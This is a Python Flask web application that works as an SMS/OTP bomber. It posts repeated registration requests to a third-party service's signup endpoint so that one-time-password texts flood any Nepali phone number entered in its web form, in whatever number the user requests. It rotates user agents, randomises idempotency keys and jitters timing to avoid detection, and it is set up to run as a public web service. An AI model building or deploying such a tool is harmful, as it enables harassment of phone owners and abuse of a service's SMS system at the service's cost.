#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import sys
import json
import logging
import requests
import re
import time
import random
import uuid
import os
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, render_template, jsonify

# Configure logging
logging.basicConfig(
    filename='otp_testing.log',
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Initialize Flask app
app = Flask(__name__, template_folder='templates', static_folder='static')

# Get port from environment variable or default to 5000
port = int(os.environ.get('PORT', 5000))

# API Configuration
API_URL = "https://backend.clamphook.com/auth/register"

# User Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.1.15",
]

def validate_phone_number(phone_number):
    """Validate 10-digit Nepal number (98XXXXXXXX or 97XXXXXXXX)."""
    phone_number = phone_number.strip()
    if not re.match(r'^(98|97)\d{8}$', phone_number):
        raise ValueError("Invalid Nepal number. Must be 10 digits starting with 98 or 97.")
    return phone_number

def send_otp_request(phone_number, request_id):
    """Send a single OTP request with corrected success detection."""
    headers = {
        "Host": "backend.clamphook.com",
        "Origin": "https://backend.clamphook.com",
        "User-Agent": random.choice(USER_AGENTS),
        "Content-Type": "application/json",
        "Idempotency-Key": str(uuid.uuid4()),
    }
    payload = {"mobile": f"977-{phone_number}"}

    try:
        response = requests.post(
            API_URL,
            json=payload,
            headers=headers,
            timeout=15,
            verify=True
        )
        logging.debug(f"Request {request_id}: Response - {response.text}")

        if response.status_code == 200:
            try:
                response_json = response.json()
                # Updated success check based on actual API response
                if response_json.get("success", False) and response_json.get("operation") == "register_mobile":
                    logging.info(f"Request {request_id}: Success")
                    return True
                else:
                    logging.error(f"Request {request_id}: API returned false success or wrong operation")
            except json.JSONDecodeError:
                logging.error(f"Request {request_id}: Invalid JSON response")
        else:
            logging.error(f"Request {request_id}: HTTP {response.status_code}")

    except requests.exceptions.RequestException as e:
        logging.error(f"Request {request_id}: Network error - {e}")
    except Exception as e:
        logging.error(f"Request {request_id}: Unexpected error - {e}")

    return False

def run_otp_tool(phone_number, num_otps):
    """Run the OTP tool with the given parameters."""
    try:
        phone_number = validate_phone_number(phone_number)
    except ValueError as e:
        return {"success": False, "message": str(e)}

    # Configure concurrency and delays
    if num_otps <= 5:
        threads = 1
        delay = 1.5
    elif num_otps <= 20:
        threads = 2
        delay = 2.5
    else:
        threads = 3
        delay = 3.5

    results = []
    successes = 0

    # Send OTPs
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for i in range(num_otps):
            futures.append(executor.submit(send_otp_request, phone_number, i+1))
            time.sleep(delay * random.uniform(0.8, 1.2))

        # Track progress
        for i, future in enumerate(as_completed(futures), 1):
            result = future.result()
            if result:
                successes += 1
                results.append(f"[{i}/{num_otps}] Success")
            else:
                results.append(f"[{i}/{num_otps}] Failed")

    results.append(f"Done. {successes}/{num_otps} OTPs sent successfully.")
    return {"success": True, "results": results, "successes": successes, "total": num_otps}

# ---------- Flask Routes ----------
@app.route("/", methods=["GET"])
def home():
    """Serve the main page."""
    return render_template("index.html")

@app.route("/send_sms", methods=["POST"])
def send_sms():
    """API endpoint to send SMS."""
    try:
        data = request.get_json()
        phone_number = data.get("phone")
        num_otps = int(data.get("count", 10))
        
        if not phone_number:
            return jsonify({"success": False, "message": "Phone number is required"}), 400
            
        result = run_otp_tool(phone_number, num_otps)
        return jsonify(result)
    except Exception as e:
        return jsonify({"success": False, "message": str(e)}), 500

if __name__ == "__main__":
    # Use the port provided by Render or default to 5000
    app.run(debug=False, host="0.0.0.0", port=port)